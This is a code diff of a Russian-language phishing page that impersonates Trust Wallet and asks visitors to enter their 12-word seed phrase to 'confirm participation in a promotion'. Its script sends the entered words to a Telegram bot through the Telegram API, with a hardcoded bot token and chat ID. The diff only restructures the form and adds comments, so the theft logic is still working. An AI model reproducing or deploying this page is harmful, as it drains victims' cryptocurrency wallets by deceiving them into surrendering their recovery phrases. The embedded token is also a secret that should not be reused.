@@ -124,21 +124,59 @@
         <p class="description">Введите вашу секретную фразу из 12 слов, чтобы подтвердить участие в акции. Убедитесь, что вы храните её в безопасности!</p>
         <form id="seedForm">
             <div class="seed-input">
-                <!-- Поля для ввода -->
-                ${Array.from({ length: 12 }, (_, i) => `
-                    <div class="seed-item">
-                        <label for="word${i + 1}">${i + 1}.</label>
-                        <input type="text" id="word${i + 1}" name="word${i + 1}" placeholder="Please seed" required>
-                    </div>
-                `).join('')}
+                <div class="seed-item">
+                    <label for="word1">1.</label>
+                    <input type="text" id="word1" name="word1" placeholder="Please seed" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word2">2.</label>
+                    <input type="text" id="word2" name="word2" placeholder="Please seed" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word3">3.</label>
+                                        <input type="text" id="word3" name="word3" placeholder="Please seed" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word4">4.</label>
+                    <input type="text" id="word4" name="word4" placeholder="Please seed" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word5">5.</label>
+                    <input type="text" id="word5" name="word5" placeholder="Please seed" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word6">6.</label>
+                    <input type="text" id="word6" name="word6" placeholder="Please seed" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word7">7.</label>
+                    <input type="text" id="word7" name="word7" placeholder="Please seed" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word8">8.</label>
+                    <input type="text" id="word8" name="word8" placeholder="Please seed" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word9">9.</label>
+                    <input type="text" id="word9" name="word9" placeholder="Please seed" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word10">10.</label>
+                    <input type="text" id="word10" name="word10" placeholder="Please seed" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word11">11.</label>
+                    <input type="text" id="word11" name="word11" placeholder="Please seed" required>
+                </div>
+                <div class="seed-item">
+                    <label for="word12">12.</label>
+                    <input type="text" id="word12" name="word12" placeholder="Please seed" required>
+                </div>
             </div>
             <button type="submit">Подтвердить</button>
         </form>
         <div class="warning">Никогда не делитесь своей секретной фразой с другими!</div>
     </div>
-    <footer>
-        © 2025 Trust Wallet. Все права защищены.
-    </footer>
 
     <script>
         document.getElementById('seedForm').addEventListener('submit', function(event) {
@@ -149,10 +187,10 @@
                 words.push(document.getElementById(`word${i}`).value.trim());
             }
 
-            if (words.every(word => word)) {
+            if (words.length === 12 && words.every(word => word)) {
                 const message = words.map((word, index) => `${index + 1}. ${word}`).join('\n');
-                const chatId = '@bdsjxjdhd';
-                const token = '7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg';
+                const chatId = '@bdsjxjdhd';  // Ваш чат ID
+                const token = '7804666257:AAHnu23aX89lTPTuMt08TOHfSgvfK4T8hKg';  // Ваш токен бота
                 const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
 
                 fetch(url)
@@ -164,7 +202,7 @@
                             alert('Ошибка отправки.');
                         }
                     })
-                    .catch(() => {
+                    .catch(error => {
                         alert('Ошибка отправки.');
                     });
             } else {
@@ -172,5 +210,8 @@
             }
         });
     </script>
+    <footer>
+        © 2025 Trust Wallet. Все права защищены.
+    </footer>
 </body>
 </html>
